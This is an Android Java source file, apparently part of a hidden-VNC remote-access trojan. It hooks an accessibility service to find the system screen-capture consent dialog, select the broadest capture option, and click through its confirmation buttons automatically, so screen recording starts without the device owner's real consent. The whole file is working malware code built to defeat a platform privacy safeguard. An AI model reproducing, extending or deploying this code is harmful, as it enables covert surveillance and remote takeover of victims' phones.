package com.fason.app.features.hvnc;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import android.util.Log;
import com.fason.app.core.FasonAccessibilityService;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

public class HVncAccessibilityService {
    private static final String TAG = "HVncA11y";
    private static volatile HVncAccessibilityService helperInstance;
    private static volatile FasonAccessibilityService host;
    private static final long AUTO_ACCEPT_TIMEOUT_MS = 30000;
    private static final long CONSENT_DIALOG_TIME_WINDOW_MS = 8000;
    private static final int STABILIZE_DELAY_MS = 300;
    private static final int WAIT_FINAL_DELAY_MS = STABILIZE_DELAY_MS * 2;
    private static final Object stateLock = new Object();
    private static volatile boolean autoAcceptProjection = false;
    private static volatile long autoAcceptTimestamp = 0;
    private static volatile long screenCaptureRequestTime = 0;

    private enum State {
        IDLE, OPEN_SCOPE, WAIT_FOR_LIST, SELECT_OPTION, CLICK_NEXT, WAIT_FINAL, CLICK_FINAL, DONE
    }

    private static volatile State state = State.IDLE;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Runnable processRunnable = this::processStateMachine;

    public static void onHostConnected(FasonAccessibilityService h) {
        host = h;
        helperInstance = new HVncAccessibilityService();
        Log.i(TAG, "HVNC helper attached");
    }

    public static void onHostDisconnected() {
        if (helperInstance != null) {
            helperInstance.reset("host destroyed");
        }
        helperInstance = null;
        host = null;
    }

    public static void onAccessibilityEvent(AccessibilityEvent event) {
        if (helperInstance == null || event == null || !autoAcceptProjection) return;
        if (System.currentTimeMillis() - autoAcceptTimestamp > AUTO_ACCEPT_TIMEOUT_MS) {
            helperInstance.reset("timed out");
            helperInstance.notifyFailure("timeout");
            return;
        }
        int eventType = event.getEventType();
        if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            return;
        }
        helperInstance.mainHandler.removeCallbacks(helperInstance.processRunnable);
        helperInstance.mainHandler.postDelayed(helperInstance.processRunnable, STABILIZE_DELAY_MS);
    }

    private void processStateMachine() {
        if (!autoAcceptProjection) return;
        State currentState;
        synchronized (stateLock) {
            if (state == State.DONE) return;
            currentState = state;
        }
        AccessibilityNodeInfo root = findConsentDialogRoot();
        if (root == null) {
            if (currentState == State.CLICK_NEXT || currentState == State.WAIT_FINAL ||
                currentState == State.CLICK_FINAL) {
                Log.i(TAG, "Consent dismissed, assuming success");
                synchronized (stateLock) {
                    state = State.DONE;
                    autoAcceptProjection = false;
                }
                notifySuccess();
                return;
            }
            return;
        }
        try {
            switch (currentState) {
                case IDLE:
                case OPEN_SCOPE:
                    handleOpenScope(root);
                    break;
                case WAIT_FOR_LIST:
                case SELECT_OPTION:
                    handleSelectOption(root);
                    break;
                case CLICK_NEXT:
                case CLICK_FINAL:
                    handleClickButton(root);
                    break;
                case WAIT_FINAL:
                    Log.i(TAG, "New dialog, clicking final");
                    synchronized (stateLock) { state = State.CLICK_FINAL; }
                    handleClickButton(root);
                    break;
                default:
                    break;
            }
        } finally {
            recycleQuietly(root);
        }
    }

    private void handleOpenScope(AccessibilityNodeInfo root) {
        AccessibilityNodeInfo selector = findScopeSelector(root);
        if (selector == null) {
            synchronized (stateLock) { state = State.CLICK_NEXT; }
            handleClickButton(root);
            return;
        }
        if (selector.getCollectionInfo() != null || selector.getChildCount() > 1) {
            recycleQuietly(selector);
            synchronized (stateLock) { state = State.SELECT_OPTION; }
            handleSelectOption(root);
            return;
        }
        selector.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        recycleQuietly(selector);
        synchronized (stateLock) { state = State.WAIT_FOR_LIST; }
        scheduleRetry();
    }

    private void handleSelectOption(AccessibilityNodeInfo root) {
        AccessibilityNodeInfo list = findListContainer(root);
        if (list == null) {
            synchronized (stateLock) { state = State.CLICK_NEXT; }
            handleClickButton(root);
            return;
        }
        List<AccessibilityNodeInfo> items = new ArrayList<>();
        collectSelectableItems(list, items);
        if (items.size() >= 2) {
            AccessibilityNodeInfo best = null;
            int bestTextLen = -1;
            for (AccessibilityNodeInfo item : items) {
                int textLen = getNodeTextLength(item);
                if (textLen > bestTextLen) {
                    bestTextLen = textLen;
                    if (best != null) recycleQuietly(best);
                    best = item;
                } else {
                    recycleQuietly(item);
                }
            }
            if (best == null) {
                best = items.get(items.size() - 1);
            }
            Log.i(TAG, "Selecting longest option");
            best.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            recycleQuietly(best);
            synchronized (stateLock) { state = State.CLICK_NEXT; }
        } else if (items.size() == 1) {
            Log.i(TAG, "Selecting only option");
            items.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
            recycleQuietly(items.get(0));
            synchronized (stateLock) { state = State.CLICK_NEXT; }
        } else {
            synchronized (stateLock) { state = State.CLICK_NEXT; }
        }
        recycleQuietly(list);
        scheduleRetry();
    }

    private void handleClickButton(AccessibilityNodeInfo root) {
        AccessibilityNodeInfo button = findBestPositiveButton(root);
        if (button == null) {
            scheduleRetry();
            return;
        }
        Log.i(TAG, "Clicking positive button");
        boolean clicked = button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        recycleQuietly(button);
        if (clicked) {
            State currentState;
            synchronized (stateLock) { currentState = state; }
            if (currentState == State.CLICK_NEXT) {
                synchronized (stateLock) { state = State.WAIT_FINAL; }
                scheduleRetry(WAIT_FINAL_DELAY_MS);
            } else if (currentState == State.CLICK_FINAL) {
                Log.i(TAG, "Consent completed");
                synchronized (stateLock) {
                    state = State.DONE;
                    autoAcceptProjection = false;
                }
                notifySuccess();
            }
        } else {
            Log.w(TAG, "performAction failed, retrying");
            scheduleRetry();
        }
    }

    private AccessibilityNodeInfo findConsentDialogRoot() {
        if (host == null) return null;
        List<AccessibilityWindowInfo> windows = host.getWindows();
        if (windows == null || windows.isEmpty()) {
            AccessibilityNodeInfo root = host.getRootInActiveWindow();
            if (root != null && matchesConsentComposite(null, root)) return root;
            recycleQuietly(root);
            return null;
        }
        List<AccessibilityWindowInfo> sorted = new ArrayList<>(windows);
        Collections.sort(sorted, new Comparator<AccessibilityWindowInfo>() {
            @Override
            public int compare(AccessibilityWindowInfo a, AccessibilityWindowInfo b) {
                return Integer.compare(b.getLayer(), a.getLayer());
            }
        });
        for (AccessibilityWindowInfo window : sorted) {
            AccessibilityNodeInfo root = window.getRoot();
            if (root == null) continue;
            if (matchesConsentComposite(window, root)) {
                return root;
            }
            recycleQuietly(root);
        }
        return null;
    }

    private boolean matchesConsentComposite(AccessibilityWindowInfo window, AccessibilityNodeInfo root) {
        if (root == null) return false;
        if (window != null) {
            int type = window.getType();
            boolean allowed = type == AccessibilityWindowInfo.TYPE_APPLICATION
                || type == AccessibilityWindowInfo.TYPE_SYSTEM;
            if (!allowed) return false;
        }
        if (!isSystemApp(root)) return false;
        long elapsed = System.currentTimeMillis() - screenCaptureRequestTime;
        if (elapsed > CONSENT_DIALOG_TIME_WINDOW_MS) {
            State currentState;
            synchronized (stateLock) { currentState = state; }
            if (currentState == State.IDLE) return false;
        }
        if (!matchesConsentSignature(root)) return false;
        return true;
    }

    private boolean isSystemApp(AccessibilityNodeInfo root) {
        if (root == null || host == null) return false;
        CharSequence pkg = root.getPackageName();
        if (pkg == null) return false;
        String p = pkg.toString();
        if (p.isEmpty()) return false;
        try {
            ApplicationInfo info = host.getPackageManager().getApplicationInfo(p, 0);
            boolean isSystem = (info.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
            boolean isUpdatedSystem = (info.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0;
            return isSystem || isUpdatedSystem;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean matchesConsentSignature(AccessibilityNodeInfo root) {
        if (root == null) return false;
        SignatureCounters c = new SignatureCounters();
        countNodeTypes(root, c);
        if (c.clickableLeafCount < 2 || c.clickableLeafCount > 3) return false;
        if (c.editTextCount > 0) return false;
        if (c.checkboxCount > 0) return false;
        if (c.switchCount > 0) return false;
        if (c.textNodeCount < 2) return false;
        return true;
    }

    private static class SignatureCounters {
        int clickableLeafCount = 0;
        int editTextCount = 0;
        int checkboxCount = 0;
        int switchCount = 0;
        int textNodeCount = 0;
    }

    private void countNodeTypes(AccessibilityNodeInfo node, SignatureCounters c) {
        if (node == null) return;
        CharSequence cls = node.getClassName();
        if (cls != null) {
            String s = cls.toString();
            if (s.contains("EditText")) c.editTextCount++;
            else if (s.contains("CheckBox")) c.checkboxCount++;
            else if (s.contains("Switch")) c.switchCount++;
        }
        if (node.getText() != null && node.getText().length() > 0) c.textNodeCount++;
        boolean hasClickableChild = false;
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (child.isClickable()) hasClickableChild = true;
                countNodeTypes(child, c);
                recycleQuietly(child);
            }
        }
        if (node.isClickable() && node.isEnabled() && !hasClickableChild) {
            c.clickableLeafCount++;
        }
    }

    private AccessibilityNodeInfo findScopeSelector(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.getCollectionInfo() != null) {
            return AccessibilityNodeInfo.obtain(node);
        }
        CharSequence cls = node.getClassName();
        if (cls != null && cls.toString().contains("Spinner")) {
            return AccessibilityNodeInfo.obtain(node);
        }
        if (node.isClickable()) {
            if (cls == null || !cls.toString().contains("Button")) {
                if (node.getChildCount() > 0) {
                    AccessibilityNodeInfo child = node.getChild(0);
                    if (child != null) {
                        boolean hasText = child.getText() != null;
                        recycleQuietly(child);
                        if (hasText) return AccessibilityNodeInfo.obtain(node);
                    }
                }
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo found = findScopeSelector(child);
                if (found != null) {
                    recycleQuietly(child);
                    return found;
                }
                recycleQuietly(child);
            }
        }
        return null;
    }

    private AccessibilityNodeInfo findListContainer(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.getCollectionInfo() != null) {
            return AccessibilityNodeInfo.obtain(node);
        }
        CharSequence cls = node.getClassName();
        if (cls != null && (cls.toString().contains("ListView") || cls.toString().contains("RecyclerView"))) {
            return AccessibilityNodeInfo.obtain(node);
        }
        List<AccessibilityNodeInfo> children = new ArrayList<>();
        int clickableCount = 0;
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (child.isClickable()) clickableCount++;
                children.add(child);
                if (clickableCount >= 2) {
                    for (AccessibilityNodeInfo c : children) recycleQuietly(c);
                    return AccessibilityNodeInfo.obtain(node);
                }
            }
        }
        AccessibilityNodeInfo found = null;
        for (AccessibilityNodeInfo child : children) {
            if (child != null) {
                AccessibilityNodeInfo sub = findListContainer(child);
                if (sub != null) {
                    found = sub;
                    break;
                }
            }
        }
        for (AccessibilityNodeInfo c : children) recycleQuietly(c);
        return found;
    }

    private void collectSelectableItems(AccessibilityNodeInfo container, List<AccessibilityNodeInfo> out) {
        if (container == null) return;
        for (int i = 0; i < container.getChildCount(); i++) {
            AccessibilityNodeInfo child = container.getChild(i);
            if (child == null) continue;
            if (child.isClickable() && child.isEnabled()) {
                out.add(AccessibilityNodeInfo.obtain(child));
            } else {
                collectSelectableItems(child, out);
            }
            recycleQuietly(child);
        }
    }

    private int getNodeTextLength(AccessibilityNodeInfo node) {
        if (node == null) return 0;
        int len = 0;
        if (node.getText() != null) len += node.getText().length();
        if (node.getContentDescription() != null) len += node.getContentDescription().length();
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                len += getNodeTextLength(child);
                recycleQuietly(child);
            }
        }
        return len;
    }

    private AccessibilityNodeInfo findBestPositiveButton(AccessibilityNodeInfo root) {
        if (root == null) return null;
        List<AccessibilityNodeInfo> candidates = new ArrayList<>();
        collectClickableCandidates(root, candidates);
        if (candidates.isEmpty()) return null;
        boolean isRtl = isRtlLayout();
        android.graphics.Rect maxBounds = new android.graphics.Rect();
        maxBounds.left = Integer.MAX_VALUE;
        maxBounds.top = Integer.MAX_VALUE;
        maxBounds.right = Integer.MIN_VALUE;
        maxBounds.bottom = Integer.MIN_VALUE;
        android.graphics.Rect temp = new android.graphics.Rect();
        for (AccessibilityNodeInfo c : candidates) {
            c.getBoundsInScreen(temp);
            maxBounds.left = Math.min(maxBounds.left, temp.left);
            maxBounds.top = Math.min(maxBounds.top, temp.top);
            maxBounds.right = Math.max(maxBounds.right, temp.right);
            maxBounds.bottom = Math.max(maxBounds.bottom, temp.bottom);
        }
        int tolerance = getPositionTolerancePx();
        AccessibilityNodeInfo best = null;
        int bestScore = Integer.MIN_VALUE;
        for (AccessibilityNodeInfo node : candidates) {
            int score = 0;
            CharSequence cls = node.getClassName();
            if (cls != null && cls.toString().contains("Button")) score += 10;
            if (node.isClickable()) score += 5;
            if (node.isEnabled()) score += 5;
            if (node.isFocusable()) score += 2;
            node.getBoundsInScreen(temp);
            if (isRtl) {
                if (temp.left <= maxBounds.left + tolerance) score += 3;
                if (temp.bottom >= maxBounds.bottom - tolerance) score += 3;
            } else {
                if (temp.right >= maxBounds.right - tolerance) score += 3;
                if (temp.bottom >= maxBounds.bottom - tolerance) score += 3;
            }
            if (score > bestScore) {
                bestScore = score;
                if (best != null) recycleQuietly(best);
                best = AccessibilityNodeInfo.obtain(node);
            }
        }
        for (AccessibilityNodeInfo node : candidates) {
            if (node != best) recycleQuietly(node);
        }
        return best;
    }

    private boolean isRtlLayout() {
        try {
            if (host == null) return false;
            Configuration config = host.getResources().getConfiguration();
            return config.getLayoutDirection() == View.LAYOUT_DIRECTION_RTL;
        } catch (Exception e) {
            return false;
        }
    }

    private int getPositionTolerancePx() {
        try {
            if (host == null) return 50;
            float density = host.getResources().getDisplayMetrics().density;
            return (int) (50 * density);
        } catch (Exception e) {
            return 50;
        }
    }

    private void collectClickableCandidates(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> out) {
        if (node == null) return;
        if (node.isClickable() && node.isEnabled()) {
            out.add(AccessibilityNodeInfo.obtain(node));
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                collectClickableCandidates(child, out);
                recycleQuietly(child);
            }
        }
    }

    private void notifySuccess() {
        try {
            HVncManager.getInstance().onAutoAcceptResult(true, null);
        } catch (Exception ignored) {}
    }

    private void notifyFailure(String reason) {
        try {
            HVncManager.getInstance().onAutoAcceptResult(false, reason);
        } catch (Exception ignored) {}
    }

    private void recycleQuietly(AccessibilityNodeInfo node) {
        if (node != null) {
            try { node.recycle(); } catch (Exception ignored) {}
        }
    }

    private void scheduleRetry() {
        scheduleRetry(STABILIZE_DELAY_MS);
    }

    private void scheduleRetry(int delay) {
        mainHandler.removeCallbacks(processRunnable);
        mainHandler.postDelayed(processRunnable, delay);
    }

    public static HVncAccessibilityService getInstance() {
        return helperInstance;
    }

    public static boolean isServiceConnected() {
        return helperInstance != null;
    }

    public static synchronized void enableAutoAccept() {
        synchronized (stateLock) {
            autoAcceptProjection = true;
            autoAcceptTimestamp = System.currentTimeMillis();
            screenCaptureRequestTime = System.currentTimeMillis();
            state = State.IDLE;
        }
        Log.i(TAG, "Auto-accept enabled");
    }

    public static void disableAutoAccept() {
        synchronized (stateLock) {
            autoAcceptProjection = false;
            state = State.IDLE;
        }
    }

    private void reset(String reason) {
        synchronized (stateLock) {
            autoAcceptProjection = false;
            state = State.IDLE;
        }
        mainHandler.removeCallbacks(processRunnable);
        Log.w(TAG, "Auto-accept " + reason);
    }
}
